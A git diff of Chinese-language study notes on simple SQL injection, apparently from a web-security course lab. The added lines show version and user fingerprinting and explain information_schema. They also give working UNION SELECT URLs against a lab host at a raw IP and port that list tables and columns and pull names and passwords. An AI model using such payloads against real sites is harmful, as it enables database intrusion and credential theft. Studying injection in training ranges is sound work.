@@ -1,4 +1,4 @@
-﻿# WEB漏洞-SQL注入之简易sql注入
+﻿# WEB漏洞-SQL注入之简易sql注入   
 
 标签（空格分隔）： SQL注入
 
@@ -57,11 +57,25 @@ SELECT * FROM users WHERE id=1xxxx(随意、怎么舒服怎么来！) LIMIT 0,1
 错误值 错误网页报错
 
 ## 信息收集：
-> 数据库版本：version（）
-数据库名字：database（）
-数据库用户：user（）
-操作系统： @@version_compile_os
+> 数据库版本：version（）5.7.22-0ubuntu0.16.04.1
+数据库名字：database（）mozhe_Discuz_StormGroup
+数据库用户：user（） root@localhost
+操作系统： @@version_compile_os Linux
 
+> 必要知识点：在MySQL5.0以上版本中，MySQL存在一个自带数据库名为 information_schema ，它是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或者列名信息。
+
+> 数据库中符号“.”代表下一级，如xiao.user表示xiao数据库下的user表名
+information_schema.tables; 记录所有表名信息的表
+information_schema.columns; 记录所有列名信息的表
+table_name; 表名
+column_name; 列名
+查询指定数据库下所有表名信息  StormGroup_member,notice
+http://124.70.22.208:43757/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’
+查询指定表名下所有列名信息  id,name,password,status
+http://124.70.22.208:43757/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=‘StormGroup_member’
+查询指定数据
+http://124.70.22.208:43757/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member
+> limit可以猜解多个数据 limit x,1 变动猜解
 ## 视频中出现的题目
 > 1.可能存在注入的编号选项有哪几个？
 1-www.xiaodi8.com/index.php?id=8
